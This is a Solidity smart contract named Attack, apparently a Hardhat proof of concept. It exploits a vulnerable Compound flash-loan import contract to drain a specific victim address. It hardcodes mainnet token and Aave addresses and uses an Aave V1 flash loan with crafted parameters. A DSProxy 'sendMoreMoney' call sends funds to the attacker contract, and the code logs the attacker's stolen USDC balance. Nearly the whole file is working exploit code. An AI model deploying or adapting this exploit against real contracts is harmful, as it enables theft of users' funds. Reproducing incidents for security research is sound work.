// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./CompoundImportFlashLoan.sol";
import "./ILendingPool.sol";
import "hardhat/console.sol";

contract Attack {

    address payable victimAddr = 0xf69EA6646cf682262E84cd7c67133eac59cef07b;
    address payable cWBTC_addr = 0xC11b1268C1A384e55C48c2391d8d480264A3A7F4;
    address payable cUSDC_addr = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
    address payable USDC_addr = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address payable aaveV1 = 0x398eC7346DcD622eDc5ae82352F02bE94C62d119;
    address payable vulnContrAddr; // = 0xaf9f8781A4c39Ce2122019fC05F22e3a662B0A32;
    address payable targetProxy;
    address payable owner;

    constructor (address payable _targetProxy, address payable _vulnContrAddr) public {
        owner = msg.sender;
        targetProxy = _targetProxy;
        vulnContrAddr = _vulnContrAddr;

        /* Stats */
        /* 
        uint256 balance = CTokenInterface(cWBTC_addr).balanceOf(victimAddr);
        console.log("[ATK] Victim Balance is: ",  balance);
        uint256 allowance = CTokenInterface(cWBTC_addr).allowance(victimAddr, vulnContrAddr);
        console.log("[ATK] Victim to Vuln Contract Allowance is: ",  allowance);
        balance = CTokenInterface(cUSDC_addr).borrowBalanceStored(victimAddr);
        console.log("[ATK] Victim Borrow Balance is: ",  balance);
        */
    }

    function exploit() public {
        uint256 victimLoanAmount = CTokenInterface(cUSDC_addr).borrowBalanceCurrent(victimAddr);
        bytes memory params = abi.encode(cWBTC_addr, cUSDC_addr, victimAddr, targetProxy);
        ILendingPool(aaveV1).flashLoan(vulnContrAddr, USDC_addr, victimLoanAmount, params);
    }

    function transferFunds() public {
        address attackerAccount = address(this);
        bytes memory proxyData = abi.encodeWithSignature( "sendMoreMoney(address)", attackerAccount );
        DSProxyInterface(targetProxy).execute(targetProxy, proxyData);
    }

    function checkBalance() public {
        uint256 balance = CTokenInterface(USDC_addr).balanceOf(address(this));
        console.log("[ATK] Attacker Contract USDC Balance is: ", balance);
    }
}

